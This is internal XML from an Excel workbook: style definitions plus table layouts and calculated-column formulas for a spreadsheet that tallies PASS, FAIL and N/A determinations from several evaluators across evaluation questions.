      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial Unicode MS"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF000000"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="12"/>
      <color rgb="FF000000"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="12"/>
      <color rgb="FF000000"/>
      <name val="Aptos Narrow"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF000000"/>
      <name val="Aptos Narrow"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FFFFFFFF"/>
      <name val="Calibri"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="8"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="12"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="12"/>
      <color theme="0"/>
      <name val="Aptos Narrow"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="0"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
  </fonts>
  <fills count="15">
    <fill>
      <patternFill patternType="none"/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="6" tint="0.39997558519241921"/>
        <bgColor indexed="65"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFEB9C"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="4"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="5"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="9"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="2"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFD9D9D9"/>
        <bgColor rgb="FF000000"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFC000"/>
        <bgColor rgb="FF000000"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FF70AD47"/>
        <bgColor rgb="FF70AD47"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFE2EFDA"/>
        <bgColor rgb="FFE2EFDA"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="9" tint="0.79998168889431442"/>
        <bgColor theme="9" tint="0.79998168889431442"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="4" tint="0.79998168889431442"/>
        <bgColor indexed="65"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="5" tint="0.79998168889431442"/>
        <bgColor indexed="65"/>
      </patternFill>
    </fill>
  </fills>
  <borders count="8">
    <border>
      <left/>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color theme="4" tint="0.39997558519241921"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color rgb="FF8EA9DB"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color rgb="FFA9D08E"/>
      </top>
      <bottom style="thin">
        <color rgb="FFA9D08E"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color rgb="FFA9D08E"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color rgb="FFA9D08E"/>
      </top>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10">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="3"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9" fontId="5" fillId="0" borderId="0" applyFont="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="6" applyNumberFormat="0" applyFill="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="1" fillId="13" borderId="0" applyNumberFormat="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="1" fillId="14" borderId="0" applyNumberFormat="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
  </cellStyleXfs>
  <cellXfs count="46">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="49" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="3" fillId="2" borderId="0" xfId="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="2" borderId="0" xfId="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="5" borderId="0" xfId="4" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="6" borderId="0" xfId="5" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="1" xfId="0" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="3" fillId="2" borderId="0" xfId="1" applyNumberFormat="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="2" borderId="0" xfId="1" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="7" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="0" fillId="7" borderId="0" xfId="0" applyNumberFormat="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9"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15" fillId="8" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="14" fillId="8" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="11" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="15" fillId="9" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="14" fillId="9" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="17" fillId="11" borderId="3" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="17" fillId="0" borderId="3" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="2" xfId="0" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="3" borderId="0" xfId="2" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="3" borderId="0" xfId="2" applyNumberFormat="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="16" fillId="10" borderId="4" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="17" fillId="11" borderId="5" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="17" fillId="11" borderId="4" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="4" borderId="0" xfId="3" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="2" borderId="0" xfId="1"/>
    <xf numFmtId="0" fontId="20" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" quotePrefix="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="12" borderId="7" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0" xfId="6" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0" xfId="6" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="12" borderId="6" xfId="7" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="5" borderId="0" xfId="4"/>
    <xf numFmtId="0" fontId="1" fillId="14" borderId="6" xfId="9" applyBorder="1"/>
    <xf numFmtId="9" fontId="1" fillId="14" borderId="6" xfId="9" applyNumberFormat="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="9" fontId="1" fillId="13" borderId="6" xfId="8" applyNumberFormat="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
  </cellXfs>
  <cellStyles count="10">
    <cellStyle name="20% - Accent1" xfId="8" builtinId="30"/>
    <cellStyle name="20% - Accent2" xfId="9" builtinId="34"/>
    <cellStyle name="60% - Accent3" xfId="1" builtinId="40"/>
    <cellStyle name="Accent1" xfId="3" builtinId="29"/>
    <cellStyle name="Accent2" xfId="4" builtinId="33"/>
    <cellStyle name="Accent6" xfId="5" builtinId="49"/>
    <cellStyle name="Neutral" xfId="2" builtinId="28"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
    <cellStyle name="Percent" xfId="6" builtinId="5"/>
    <cellStyle name="Total" xfId="7" builtinId="25"/>
  </cellStyles>
  <dxfs count="129">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rgb="FF000000"/>
        <name val="Calibri"/>
        <family val="2"/>
        <scheme val="none"/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1"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fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1"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fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1"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fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1"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fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1"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fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1"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fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
      <border diagonalUp="0" diagonalDown="0">
        <left/>
        <right/>
        <top style="thin">
          <color rgb="FFA9D08E"/>
        </top>
        <bottom style="thin">
          <color rgb="FFA9D08E"/>
        </bottom>
        <vertical/>
        <horizontal/>
      </border>
    </dxf>
    <dxf>
      <font>
        <b val="0"/>
        <i val="0"/>
        <strike val="0"/>
        <condense val="0"/>
        <extend val="0"/>
        <outline val="0"/>
        <shadow val="0"/>
        <u val="none"/>
        <vertAlign val="baseline"/>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <name val="Calibri"/>
        <family val="2"/>
        <scheme val="none"/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
      <border diagonalUp="0" diagonalDown="0">
        <left/>
        <right/>
        <top style="thin">
          <color rgb="FFA9D08E"/>
        </top>
        <bottom style="thin">
          <color rgb="FFA9D08E"/>
        </bottom>
        <vertical/>
        <horizontal/>
      </border>
    </dxf>
    <dxf>
      <border outline="0">
        <top style="thin">
          <color rgb="FFA9D08E"/>
        </top>
      </border>
    </dxf>
    <dxf>
      <border outline="0">
        <left style="thin">
          <color rgb="FF8EA9DB"/>
        </left>
        <right style="thin">
          <color rgb="FF8EA9DB"/>
        </right>
        <top style="thin">
          <color rgb="FF8EA9DB"/>
        </top>
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>
        </bottom>
      </border>
    </dxf>
    <dxf>
      <font>
        <b val="0"/>
        <i val="0"/>
        <strike val="0"/>
        <condense val="0"/>
        <extend val="0"/>
        <outline val="0"/>
        <shadow val="0"/>
        <u val="none"/>
        <vertAlign val="baseline"/>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <name val="Calibri"/>
        <family val="2"/>
        <scheme val="none"/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA"/>
        </patternFill>
      </fill>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color rgb="FFA9D08E"/>
        </bottom>
      </border>
    </dxf>
    <dxf>
      <font>
        <b/>
        <i val="0"/>
        <strike val="0"/>
        <condense val="0"/>
        <extend val="0"/>
        <outline val="0"/>
        <shadow val="0"/>
        <u val="none"/>
        <vertAlign val="baseline"/>
        <sz val="11"/>
        <color rgb="FFFFFFFF"/>
        <name val="Calibri"/>
        <family val="2"/>
        <scheme val="none"/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="FF70AD47"/>
          <bgColor rgb="FF70AD47"/>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gColor indexed="64"/>
          <bgColor indexed="65"/>
        </patternFill>
      </fill>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general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color theme="4" tint="0.39997558519241921"/>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gColor indexed="64"/>
          <bgColor indexed="65"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <border outline="0">
        <top style="thin">
          <color rgb="FF8EA9DB"/>
        </top>
      </border>
    </dxf>
    <dxf>
      <border outline="0">
        <left style="thin">
          <color rgb="FF8EA9DB"/>
        </left>
        <right style="thin">
          <color rgb="FF8EA9DB"/>
        </right>
        <top style="thin">
          <color rgb="FF8EA9DB"/>
        </top>
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>
        </bottom>
      </border>
    </dxf>
    <dxf>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>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general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color theme="4" tint="0.39997558519241921"/>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general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color theme="4" tint="0.39997558519241921"/>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fill>
        <patternFill patternType="none">
          <fgColor indexed="64"/>
          <bgColor indexed="65"/>
        </patternFill>
      </fil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rgb="FF8EA9DB"/>
        </top>
      </border>
    </dxf>
    <dxf>
      <border outline="0">
        <left style="thin">
          <color rgb="FF8EA9DB"/>
        </left>
        <right style="thin">
          <color rgb="FF8EA9DB"/>
        </right>
        <top style="thin">
          <color rgb="FF8EA9DB"/>
        </top>
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>
        </bottom>
      </border>
    </dxf>
    <dxf>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>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rgb="FF8EA9DB"/>
        </top>
      </border>
    </dxf>
    <dxf>
      <border outline="0">
        <left style="thin">
          <color rgb="FF8EA9DB"/>
        </left>
        <right style="thin">
          <color rgb="FF8EA9DB"/>
        </right>
        <top style="thin">
          <color rgb="FF8EA9DB"/>
        </top>
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>
        </bottom>
      </border>
    </dxf>
    <dxf>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <bottom style="thin">
          <color rgb="FF8EA9DB"/>
        </bottom>
      </border>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scheme val="none"/>
      </font>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <font>
        <b/>
        <i val="0"/>
        <strike val="0"/>
        <condense val="0"/>
        <extend val="0"/>
        <outline val="0"/>
        <shadow val="0"/>
        <u val="none"/>
        <vertAlign val="baseline"/>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <name val="Aptos Narrow"/>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scheme val="none"/>
      </font>
      <alignment horizontal="general" vertical="bottom" textRotation="0" wrapText="1" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <font>
        <b/>
        <i val="0"/>
        <strike val="0"/>
        <condense val="0"/>
        <extend val="0"/>
        <outline val="0"/>
        <shadow val="0"/>
        <u val="none"/>
        <vertAlign val="baseline"/>
        <sz val="12"/>
        <color theme="0"/>
        <name val="Aptos Narrow"/>
        <scheme val="none"/>
      </font>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1AB9B82-ED02-0D43-80D0-C283A024E2C6}" name="Table110" displayName="Table110" ref="A1:K41" totalsRowShown="0" headerRowDxfId="119" dataDxfId="118">
  <autoFilter ref="A1:K41" xr:uid="{C258506C-22AE-AF4A-BA56-56FB61E3D500}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K41">
    <sortCondition ref="B1:B41"/>
  </sortState>
  <tableColumns count="11">
    <tableColumn id="1" xr3:uid="{4743621F-0F66-BD4D-B8C7-22463F3A1DA0}" name="Evaluation Question" dataDxfId="117"/>
    <tableColumn id="2" xr3:uid="{E3EC8CFB-5677-E443-BBF9-82C140F96EBE}" name="ID" dataDxfId="116"/>
    <tableColumn id="5" xr3:uid="{A1D815A8-19C1-F042-9F64-540A54019270}" name="Scoring Category" dataDxfId="115"/>
    <tableColumn id="4" xr3:uid="{DC2758F8-9170-EB49-AE98-536C13637442}" name="Eliminated Prior to Manual Evaluation (Yes, No, Automated)" dataDxfId="114" dataCellStyle="60% - Accent3"/>
    <tableColumn id="14" xr3:uid="{BC8D6ABE-FF06-A84A-9566-1570A0763E59}" name="Eliminated During Manual Evaluation (Yes, No, Automated, N/A)" dataDxfId="113" dataCellStyle="60% - Accent3"/>
    <tableColumn id="8" xr3:uid="{06EBB945-61F2-694C-98E7-4D94D0DC13C7}" name="Final Validated Scoring Procedure (Questionnaire, Automated Script, Eliminated)" dataDxfId="112">
      <calculatedColumnFormula>IF(OR(D2="Yes",E2="Yes"),"Eliminated", IF(OR(D2="Automated",E2="Automated"),"Automated Script", IF(AND(D2="No",E2="No"),"Questionnaire","")))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="22" xr3:uid="{60A30934-3386-7647-826C-8CFDF50B168A}" name="Authoritative Data Sources (Map to output JSON)" dataDxfId="111"/>
    <tableColumn id="6" xr3:uid="{B485F149-0235-4E4B-8251-5A5AA79EFA6E}" name="Column1" dataDxfId="110"/>
    <tableColumn id="21" xr3:uid="{9E2AF43A-1F3A-7D47-A08A-4327DCD2EBAB}" name="Programmatic Steps or Automated Function" dataDxfId="109"/>
    <tableColumn id="19" xr3:uid="{7ED54919-8FC5-6343-A5FC-0726DBB97E04}" name="Justification for Elimination" dataDxfId="108" dataCellStyle="60% - Accent3"/>
    <tableColumn id="20" xr3:uid="{DAE4BF81-3BB5-294D-841C-F04A98FCEF8A}" name="Final Notes" dataDxfId="107" dataCellStyle="60% - Accent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2F9361B-C0F0-BD44-9791-5441EB0E038B}" name="Table412" displayName="Table412" ref="A1:H10" totalsRowShown="0" headerRowDxfId="106" dataDxfId="104" headerRowBorderDxfId="105" tableBorderDxfId="103" totalsRowBorderDxfId="102" headerRowCellStyle="Normal" dataCellStyle="Normal">
  <autoFilter ref="A1:H10" xr:uid="{962368DE-65FF-294F-9E93-5DAEB40675D0}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:G10">
    <sortCondition ref="B1:B10"/>
  </sortState>
  <tableColumns count="8">
    <tableColumn id="1" xr3:uid="{65B728BF-FA3A-4147-AD3D-69AD9D9FFF39}" name="Scoring Category" dataDxfId="101" dataCellStyle="Normal"/>
    <tableColumn id="2" xr3:uid="{9C2EDA4C-532B-C445-A786-D85C41F03800}" name="ID" dataDxfId="100" dataCellStyle="Normal"/>
    <tableColumn id="3" xr3:uid="{C471FEED-1029-EB4B-88CE-E8E9D261A467}" name="Evaluation Question" dataDxfId="99" dataCellStyle="Normal"/>
    <tableColumn id="4" xr3:uid="{509F3EB1-634E-2248-BA90-466664305DA0}" name="Decision if TRUE" dataDxfId="98"/>
    <tableColumn id="12" xr3:uid="{2C7DA9B5-7F01-2848-939C-84C81A468E1B}" name="Evaluation Steps (Scoring Aid)" dataDxfId="97" dataCellStyle="Normal"/>
    <tableColumn id="13" xr3:uid="{8A0C10E5-D57A-B541-A908-F8AC176D1985}" name="Evaluator Determination" dataDxfId="96" dataCellStyle="Normal"/>
    <tableColumn id="14" xr3:uid="{0E2071E1-13ED-A84B-836A-7C7EBFD603F9}" name="Notes/Comments On Scoring" dataDxfId="95" dataCellStyle="Normal"/>
    <tableColumn id="17" xr3:uid="{49F35176-9A89-B74F-A502-1C5D6A65288D}" name="Notes/Comments on Question" dataDxfId="94" dataCellStyle="Normal"/>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92D081-C0BA-DC4C-9718-24BAF40A54D3}" name="Table4123" displayName="Table4123" ref="A1:Q10" totalsRowShown="0" headerRowDxfId="93" dataDxfId="91" headerRowBorderDxfId="92" tableBorderDxfId="90" totalsRowBorderDxfId="89" headerRowCellStyle="Normal" dataCellStyle="Normal">
  <autoFilter ref="A1:Q10" xr:uid="{962368DE-65FF-294F-9E93-5DAEB40675D0}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:G10">
    <sortCondition ref="B1:B10"/>
  </sortState>
  <tableColumns count="17">
    <tableColumn id="1" xr3:uid="{3A976806-8EE5-034B-8BD1-979329796B0D}" name="Scoring Category" dataDxfId="88" dataCellStyle="Normal"/>
    <tableColumn id="2" xr3:uid="{79314623-DC52-4647-9310-898824EE1809}" name="ID" dataDxfId="87" dataCellStyle="Normal"/>
    <tableColumn id="3" xr3:uid="{7B48D282-B88F-4A44-B738-88D42681AB40}" name="Evaluation Question" dataDxfId="86" dataCellStyle="Normal"/>
    <tableColumn id="8" xr3:uid="{A7EFD7E5-EA3C-AE40-BB98-54DB8B9BA124}" name="Decision if TRUE" dataDxfId="85"/>
    <tableColumn id="12" xr3:uid="{BE4FE525-9896-F140-90A9-846A4E640013}" name="Evaluation Steps (Scoring Aid)" dataDxfId="84" dataCellStyle="Normal"/>
    <tableColumn id="13" xr3:uid="{351DB777-20FF-C042-B358-5451D231882E}" name="Evaluator Determination 1" dataDxfId="83" dataCellStyle="Normal">
      <calculatedColumnFormula>IF('Manual Questionnaire 1'!F3,1,0)</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="14" xr3:uid="{CE62CF20-E4B8-E14C-A1E5-23323B2B6203}" name="Evaluator Determination 2" dataDxfId="82" dataCellStyle="Normal">
      <calculatedColumnFormula>'Manual Questionnaire 2'!F6</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="17" xr3:uid="{FC8F5714-63F9-4444-8171-6B665269F2FB}" name="Evaluator Determination 3" dataDxfId="81" dataCellStyle="Normal">
      <calculatedColumnFormula>'Manual Questionnaire 3'!F3</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="4" xr3:uid="{AC33964D-D2D5-2C47-9257-FC313ED60222}" name="Evaluator Determination 4" dataDxfId="80" dataCellStyle="Normal">
      <calculatedColumnFormula>'Manual Questionnaire 4'!F6</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="6" xr3:uid="{E58BEC55-9B1E-C84C-A338-BF7F0FF0C697}" name="Evaluator Determination 5" dataDxfId="79">
      <calculatedColumnFormula>'Manual Questionnaire 5'!G6</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="5" xr3:uid="{CEB3314F-04C2-144E-8B73-F65723F68044}" name="Total PASS Evaluations" dataDxfId="78" dataCellStyle="Normal">
      <calculatedColumnFormula array="1">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="11" xr3:uid="{329FE88A-E393-334C-82C8-B37FE2436216}" name="Total FAIL Evaluations" dataDxfId="77">
      <calculatedColumnFormula array="1">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="18" xr3:uid="{F5CF60E4-3B08-134C-87CC-A834ADAB49A1}" name="Total N/A Responses" dataDxfId="76">
      <calculatedColumnFormula>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="9" xr3:uid="{DA28F2D3-D52D-D74C-81DA-6341AB4E9A02}" name="Total Responses (evaluation not blank)" dataDxfId="75" dataCellStyle="Normal">
